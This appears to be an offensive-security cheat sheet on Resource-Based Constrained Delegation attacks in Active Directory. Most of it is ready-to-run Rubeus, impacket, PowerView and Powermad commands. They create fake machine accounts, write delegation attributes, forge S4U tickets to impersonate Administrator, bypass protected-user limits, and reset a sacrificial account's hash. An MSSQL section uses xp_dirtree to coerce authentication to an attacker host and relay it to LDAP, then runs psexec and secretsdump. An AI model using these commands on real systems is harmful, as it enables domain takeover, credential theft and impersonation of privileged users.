# Resource-Based Constrained Delegation (RBCD)

### Object: msDS-AllowedToActOnBehalfOfOtherIdentity

## Tools: rbcd.py , rubeus.exe , getST , addcomputer.py

With RBCD, this is the resource machine (the machine that receives delegation) which has a list of services that can delegate to it. This list is specified in the attribute msds-allowedtoactonbehalfofotheridentity and the computer can modified its own attribute (really usefull in NTLM relay attack scenario).

## Requirements

1) The DC has to be AT LEAST a Windows Server 2012 and later

2) Domain users can create some machine, ms-ds-machineaccountquota MUST NOT be 0!

3) GenericAll or GenericWrite on Domain Controller

##### To verify

    Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local

3) Write rights on the target machine (GenericAll, GenericWrite, AllExtendedRights)

4) Target computer, object must NOT have the attribute msds-allowedtoactonbehalfofotheridentity set

       Get-NetComputer ws01 | Select-Object -Property name, msds-allowedtoactonbehalfofotheridentity

# Standard RBCD

The attacker has compromised ServiceA and wants to compromise ServiceB. He also has sufficient rights to configure msds-allowedtoactonbehalfofotheridentity on ServiceB.

### 1) Add RBCD from ServiceA to ServiceB

    Set-ADComputer ServiceB -PrincipalsAllowedToDelegateToAccount ServiceA$

### 2)  Verify property

    Get-NetComputer ServiceB | Select-Object -Property name, msds-allowedtoactonbehalfofotheridentity

### 3) Get ServiceA TGT and then S4U

    rubeus -x tgtdeleg /nowrap
    rubeus -x s4u /user:ServiceA$ /ticket:ticket.kirbi /impersonateuser:administrator /msdsspn:host/ServiceB.domain.local /domain:domain.local /altservice:cifs,host,http,winrm,RPCSS,wsman /ptt

## Linux

### 1) Add RBCD from ServiceA to ServiceB

    rbcd.py -action write -delegate-from ServiceA$ -delegate-to ServiceB$ domain.local/user1:password

### 2) Verify property

    rbcd.py -action read -delegate-to ServiceB$ domain.local/user1:password

###Get ServiceA TGT and then S4U

    getST.py -spn 'cifs/serviceB.domain.local' -impersonate administrator -hashes ':<ServiceA_NThash>' -dc-ip <DC_IP> domain.local/ServiceA$
    export KRB5CCNAME=./Administrator.ccache

# With machine account creation

### 1) Add a fake machine account in the domain

### 2) Add it to the msds-allowedtoactonbehalfofotheridentity attribute of the target machine

    Import-Module Powermad.ps1
    Import-Module PowerView.ps1

##### Creds if needed, to run as another user

    $SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
    $Cred = New-Object System.Management.Automation.PSCredential('domain.local\user1', $SecPassword)

##### Check requirements

    Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local -Credential $Cred
    Get-NetComputer <target> -Domain domain.local | Select-Object -Property name, msds-allowedtoactonbehalfofotheridentity

##### Add the fake machine as a resource + get its SID

    New-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString 'Password123!' -AsPlainText -Force) -Credential $Cred -Verbose -Domain domain.local -DomainController DC.domain.local
    Get-DomainComputer FAKE01 -Domain domain.local -Credential $Cred
    $ComputerSid = Get-DomainComputer FAKE01 -Properties objectsid | Select -Expand objectsid

##### Create the new raw security descriptor

    $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
    $SDBytes = New-Object byte[] ($SD.BinaryLength)
    $SD.GetBinaryForm($SDBytes, 0)

##### Add the new raw SD to msds-allowedtoactonbehalfofotheridentity

    Get-DomainComputer <target> -SearchBase "LDAP://DC=domain,DC=local" -Credential $Cred | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -SearchBase "LDAP://DC=domain,DC=local" -Verbose -Credential $Cred

##### Check if well added

    $RawBytes = Get-DomainComputer <target> -Properties 'msds-allowedtoactonbehalfofotheridentity' -Credential $Cred -SearchBase "LDAP://DC=domain,DC=local" | select -expand msds-allowedtoactonbehalfofotheridentity
    (New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0).DiscretionaryAcl

## Linux

Create a new Machine Account

    impacket-addcomputer -computer-name 'ControlledComputer$' -computer-pass 'ComputerPassword' -dc-ip DC_IP 'domain.local/user1:password'

Set the msDS-AllowedToActOnBehalfOfOtherIdentity on our new machine account
    
    impacket-rbcd -action write -delegate-from ControlledComputer$ -delegate-to TARGET_MACHINE$ domain.local/ControlledComputer$:ComputerPassword

Get the Administrator service ticket


    getST.py -spn 'cifs/dc01.domain.local' -impersonate administrator -dc-ip <DC_IP> domain.local/ControlledComputer$:ComputerPassword

    export KRB5CCNAME=./Administrator.ccache

Authenticate with psexec

    impacket-psexec -k -no-pass dc01.domain.local -dc-ip DC_IP

### 3) Use the S4USelf function with the fake machine (on an arbitrary SPN) to create a forwardable ticket for a wanted user (not protected)

### 4) Use the S4UProxy function to obtain a ST for the impersonated user for the wanted service on the target machine

##### Calculate hash

    .\Rubeus.exe hash /password:Password123! /user:FAKE01$ /domain:domain.local

##### S4U attack

    .\Rubeus.exe s4u /user:FAKE01$ /rc4:2B576ACBE6BCFDA7294D6BD18041B8FE /impersonateuser:administrator /msdsspn:cifs/<target> /domain:domain.local /ptt /dc:DC.domain.local


# Skip S4U2Self

Attacker has compromised Service A, has sufficient ACLs against Service B to configure RBCD, and wants to attack Service B
By social engineering or any other solution, an interesting victim authenticates to Service A with a ST
Attacker dumps the ST on Service A (sekurlsa::tickets)
Attacker configures RBCD from Service A to Service B as above
Attacker performs S4UProxy and bypass S4USelf by providing the ST as evidence

    .\Rubeus.exe s4u /user:ServiceA$ /aes256:<service_key> /tgs:"/path/to/kirbi" /msdsspn:cifs/serviceB.domain.local /domain:domain.local /ptt /dc:DC.domain.local

## Linux

    getST.py -spn 'cifs/serviceB.domain.local' -additional-ticket ./ticket.ccache -hashes ':<ServiceA_NThash>' -dc-ip <DC_IP> domain.local/ServiceA$

# Reflective RBCD

With a TGT or the hash of a service account, an attacker can configure an RBCD from the service to itself, a run a full S4U to access the machine on behalf of another user.

    Set-ADComputer ServiceA -PrincipalsAllowedToDelegateToAccount ServiceA$
    .\Rubeus.exe s4u /user:ServiceA$ /aes256:<service_key> /impersonateuser:Administrator /msdsspn:cifs/serviceA.domain.local /domain:domain.local /ptt /dc:DC.domain.local

## Linux

    rbcd.py -action write -delegate-from ServiceA$ -delegate-to ServiceA$ -k -no-pass domain.local/ServiceA$
    getST.py -spn 'cifs/serviceA.domain.local' -impersonate administrator -k -no-pass -dc-ip <DC_IP> domain.local/ServiceA$

# Impersonate protected user via S4U2Self request

It is possible to impersonate a protected user with the S4USelf request if we have a TGT (or the creds) of the target machine (for example from an Unconstrained Delegation).
 
With the target TGT it is possible to realise a S4USelf request for any user and obtain a ST for the service. In case where the needed user is protected against delegation, S4USelf will still work, but the ST is not forwardable (so no S4UProxy possible) and the specified SPN is invalid...however, the SPN is not in the encrypted part of the ticket. So it is possible to modify the SPN and retrieve a valid ST for the target service with a sensitive user (and the ST PAC is well signed by the KDC).

    .\Rubeus.exe s4u /self /impersonateuser:Administrator /ticket:doIFFz[...SNIP...]TE9DQUw=  /domain:domain.local /altservice:cifs/server.domain.local /ptt

## Linux

    getST.py -self -altservice 'cifs/serviceA.domain.local' -impersonate administrator -k -no-pass -dc-ip <DC_IP> domain.local/ServiceA$

# Bypass Constrained Delegation restrictions with RBCD

Attacker compromises ServiceA and ServiceB
ServiceB is allowed to delegate to time/ServiceC (the target) without protocol transition (no S4USelf)
Attacker configures RBCD from ServiceA to ServiceB and performs a full S4U attack to obtain a forwardable ST for the Administrator to ServiceB
Attacker reuses this forwardable ST as evidence to realise a S4UProxy attack from ServiceB to time/ServiceC
Since the service is not protected in the obtained ticket, the attacker can change the ST from the previous S4UProxy execution to cifs/ServiceC

##### RBCD from A to B

    Set-ADComputer ServiceB -PrincipalsAllowedToDelegateToAccount ServiceA$
    .\Rubeus.exe s4u /user:ServiceA$ /aes256:<serviceA_key> /impersonateuser:Administrator /msdsspn:cifs/serviceB.domain.local /domain:domain.local /dc:DC.domain.local

##### S4UProxy from B to C with the obtained ST as evidence

    .\Rubeus.exe s4u /user:ServiceB$ /aes256:<serviceB_key> /tgs:<obtained_TGS> /msdsspn:time/serviceC.contoso.local /altservice:cifs /domain:domain.local /dc:DC.domain.local /ptt

## Linux

##### RBCD from A to B

    rbcd.py -action write -delegate-from ServiceA$ -delegate-to ServiceB$ -hashes ':<ServiceA_NThash>' domain.local/ServiceA$
    getST.py -spn 'cifs/serviceB.domain.local' -impersonate administrator -hashes ':<ServiceA_NThash>' -dc-ip <DC_IP> domain.local/ServiceA$

##### S4UProxy from B to C with the obtained ST as evidence

    getST.py -spn 'cifs/serviceC.domain.local' -additional-ticket ./administrator.ccache -hashes ':<ServiceB_NThash>' -dc-ip <DC_IP> domain.local/ServiceB$

# U2U RBCD with SPN-less accounts

In case where you have sufficient rights to configure an RBCD on a machine (for example with an unsigned authentication coerce via HTTP) but ms-ds-machineaccountquota equals 0, there is no ADCS with the HTTP endpoint and the Shadow Credentials attack is not possible (domain level to 2012 for example), you can realize a RBCD from a SPN-less user account. 

### 1) Configure the machine account to trust the user account you control (NTLM Relay, with the machine account's creds,...)

### 2) Obtain a TGT for the user via pass-the-hash:

       .\Rubeus.exe asktgt /user:user1 /rc4:<NT_hash> /nowrap

### 3) Request a Service Ticket via U2U (S4USelf request) with the previous TGT specified in /tgs: (additional ticket added to the request body identifying the target user account) and /ticket: (authentication). If U2U is not used, the KDC cannot find the account's LT key when a UPN is specified instead of a SPN. The account to impersonate via the future S4U request is also present: 

       .\Rubeus.exe asktgs /u2u /ticket:TGT.kirbi /tgs:TGT.kirbi /targetuser:Administrator /nowrap

### 4) Retrieve the TGT session key in HEX format

       import binascii, base64
       print(binascii.hexlify(base64.b64decode("<TGT_SESSION_KEY_B64>")).decode())

### 6) Now, change the user's long term key (his RC4 NT hash actually) to be equal to the TGT session key. The ST sent in the S4UProxy is encrypted with the session key, but the KDC will try to decipher it with the user's long term key, this is why the LT key must be equal to the session key (WARNING !!! The user's password is now equal to an unknown value, you have to use a sacrificial account to realise this attack).

       smbpasswd.py -newhashes :sessionKey 'domain.local'/'user1':'Password123!'@'DC'
   
### 7) Realize the S4UProxy request with the previous S4USelf U2U ticket (ciphered with the session key) as additional ticket and the original TGT as ticket:

       .\Rubeus.exe s4u /msdsspn:cifs/target.domain.local /ticket:TGT.kirbi /tgs:U2U.kirbi

### 8) Finally, use this ticket to do whatever you want!

## Linux

### 1) Configure the machine account to trust the user account you control (NTLM Relay, with the machine account's creds,...). Obtain a TGT for the user via pass-the-hash and extract the session key from it with this

    getTGT.py -hashes :$(pypykatz crypto nt 'password') 'domain.local'/'user1'
    describeTicket.py 'user1.ccache' | grep 'Ticket Session Key'

### 2) ow, change the user's long term key (his RC4 NT hash actually) to be equal to the TGT session key. The ST sent in the S4UProxy will be encrypted with the session key, but the KDC will try to decipher it with the    user's long term key, this is why the LT key must be equal to the session key (WARNING !!! The user's password is now equal to an unknown value, you have to use a sacrificial account to realise this attack).

    smbpasswd.py -newhashes :sessionKey 'domain.local'/'user1':'password'@'DC'

### 3) Realize the S4USelf request with a U2U request. If U2U is not used, the KDC cannot find the account's LT key when a UPN is specified instead of a SPN. Then, use the ticket obtained in the U2U S4USelf request (ciphered with the session key), to perform a S4UProxy request.

    KRB5CCNAME='user1.ccache'
    getST.py -k -no-pass -u2u -impersonate "Administrator" -spn "cifs/target.domain.local" 'domain.local'/'user1'

Finally, use the obtained ST to dump the machine LSA and SAM registers with secretsdump.

# RBCD from MSSQL Server

If we have sufficient access to a MSSQL server we can use the xp_dirtree in order to leak the Net-NTLM hash of the machine account. Additionally, the Web Service client must be running on the machine in order to trick the authentication from SMB to HTTP and avoid the NTLM signature (authentication must be sent to @80):

## 1) Create a DNS record in order to be able to leak the NTLM hash externally

### 2) Use the xp_dirtree (or xp_fileexist) function to the created DNS record on @80. This will force the authentication and leak the hash

### 3) Relay the machine hash to the LDAP server to add a controlled account (with a SPN for the further S4USelf request) to the msDS-AllowedToActOnBehalfOfOtherIdentity of the target machine

### 4) Now we can ask a ST for a user we want to impersonate for a service on the machine

##### Add the DNS

    Invoke-DNSUpdate -DNSType A -DNSName attacker.domain.local -DNSData <attacker_IP> -Realm domain.local

##### On our machine, waiting for the leak
#https://gist.github.com/3xocyte/4ea8e15332e5008581febdb502d0139c

    python rbcd_relay.py 192.168.24.10 domain.local 'target$' <controlledAccountWithASPN>

##### ON the MSSQL server

    SQLCMD -S <MSSQL_instance> -Q "exec master.dbo.xp_dirtree '\\attacker@80\a'" -U Admin -P Admin

##### After the attack, ask for a ST with full S4U

    .\Rubeus.exe s4u /user:<controlled_account> /rc4:<hash> /impersonateuser:Administrator /msdsspn:cifs/<target> /domain:domain.local /dc:DC.domain.local /ptt

## Linux

##### Add the DNS

    python3 dnstool.py -u 'domain.local\user1' -p 'password' -r 'attacker.domain.local' -d '<attacker_IP>' --action add <DC_IP>

##### On our machine, waiting for the leak
#https://gist.github.com/3xocyte/4ea8e15332e5008581febdb502d0139c

    python rbcd_relay.py 192.168.24.10 domain.local 'target$' <controlledAccountWithASPN>

##### ON the MSSQL server

    SQLCMD -S <MSSQL_instance> -Q "exec master.dbo.xp_dirtree '\\attacker@80\a'" -U Admin -P Admin

##### After the attack, ask for a ST with full S4U

    getST.py -spn cifs/target.domain.local -impersonate admininistrator -dc-ip <DC_IP> domain.local/<controlledAccountWithASPN>password

#### 1) addcomputer.py

    addcomputer.py -computer-name 'COMPUTER_NAME' -computer-pass 'COMPUTER_PASSWORD' -dc-host DC -domain-netbios DOMAIN_NETBIOS 'DOMAIN/USER:PASSWORD' (Add computer account)

#### 2) Rubeus

    rubeus.exe hash /password:COMPUTER_PASS /user:COMPUTER /domain:DOMAIN

    rubeus.exe s4u /user:FAKE_COMPUTER$ /aes256:AES_256_HASH /impersonateuser:administrator /msdsspn:cifs/VICTIM.DOMAIN.LOCAL /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:DOMAIN.LOCAL/ptt (System/Admin access)

#### 3) rbcd.py

    impacket-rbcd -delegate-to 'TARGET$' -dc-ip 'DC' -action 'read' 'domain'/'USER':'PASSWORD' (Try to read the attribute)

    impacket-rbcd -delegate-from 'COMPUTER$' -delegate-to 'TARGET$' -dc-ip 'DC' -action 'write' DOMAIN/USER:PASSWORD

    getST.py -spn 'cifs/DC_FQDN' 'DOMAIN/COMPUTER_ACCOUNT:COMPUTER_PASS' -impersonate Administrator -dc-ip DC_IP (Get TGT ticket)



#### 4) Powermad

    import-module powermad 

    New-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose (Create a new computer object)

    Get-DomainComputer fake01 (Check our newly created computer and get its SID)

### Create a new raw security descriptor for the FAKE01 computer principal

    $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-2552734371-813931464-1050690807-1154)"

    $SDBytes = New-Object byte[] ($SD.BinaryLength)

    $SD.GetBinaryForm($SDBytes, 0)

### Apply the security descriptor bytes to the target machine

    Get-DomainComputer TARGET_COMPUTER | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose

    (New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0).DiscretionaryAcl (Test if the security descriptor assigned to target computer in msds-allowedtoactonbehalfofotheridentity attribute refers to the fake01$ machine. If yes, we shall see the SID of our created computer)

### Then use Rubeus or getST to impersonate an account on our target computer of our choice
